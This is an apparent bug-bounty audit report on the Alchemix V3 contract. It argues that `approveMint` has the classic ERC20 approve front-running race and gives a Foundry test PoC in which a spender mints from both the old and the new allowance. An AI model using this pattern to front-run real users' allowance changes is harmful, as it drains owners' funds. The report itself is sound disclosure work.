# 56895 sc insight function approvemint is vulnerable to race conditions

**Submitted on Oct 21st 2025 at 15:25:47 UTC by @PotEater for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56895
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**

## Description

## Brief/Intro

The function `approveMint` is vulnerable to the classic ERC20 approve race condition, where the spender front-runs the owner, while resetting to a new allowance. Spending both allowances.

## Vulnerability Details

The function is vulnerable to the classic ERC20 approve race condition.

When Bob approves Alice 200 tokens and then decides to approve to a new value, let's say 300.

Alice may see this tx of 300 approval in the mempool, she could front-run Bob, spending her 200 tokens allowance and then she receives again 300 tokens allowance.

Bob intended to approve Alice only 200 tokens, but Alice ends up with 500 tokens total.

Code snippet:

```solidity
    function _approveMint(uint256 ownerTokenId, address spender, uint256 amount) internal {
        Account storage account = _accounts[ownerTokenId];
        account.mintAllowances[account.allowancesVersion][spender] = amount; 
        emit ApproveMint(ownerTokenId, spender, amount);
    }
```

## Impact Details

The impact is loss of funds for the owner..

It is a security best practice to increase/decrease allowance instead of setting straight to a new allowance.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L962>

## Proof of Concept

## Proof of Concept

Add this PoC in the `AlchemistV3.t.sol` test file:

```solidity
    function test_PoC(uint256 amount) external {
        amount = bound(amount, FIXED_POINT_SCALAR, accountFunds);
        uint256 ltv = 2e17;

        vm.startPrank(externalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);

        alchemist.deposit(amount, externalUser, 0);

        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(externalUser, address(alchemistNFT));

        alchemist.approveMint(tokenId, address(0xbeef), (amount + 100e18) / 2);
        vm.stopPrank();

        vm.startPrank(address(0xbeef));
        alchemist.mintFrom(tokenId, (((amount * ltv) / 2) / FIXED_POINT_SCALAR), externalUser);
        vm.stopPrank();

        vm.startPrank(externalUser);
        alchemist.approveMint(tokenId, address(0xbeef), (amount + 100e18) / 2);
        vm.stopPrank();

        vm.startPrank(address(0xbeef));
        alchemist.mintFrom(tokenId, (((amount * ltv) / 2) / FIXED_POINT_SCALAR), externalUser);
        vm.stopPrank();
    }
```

This PoC demonstrates how 0xbeef would front-run externalUser, minting from both allowances.
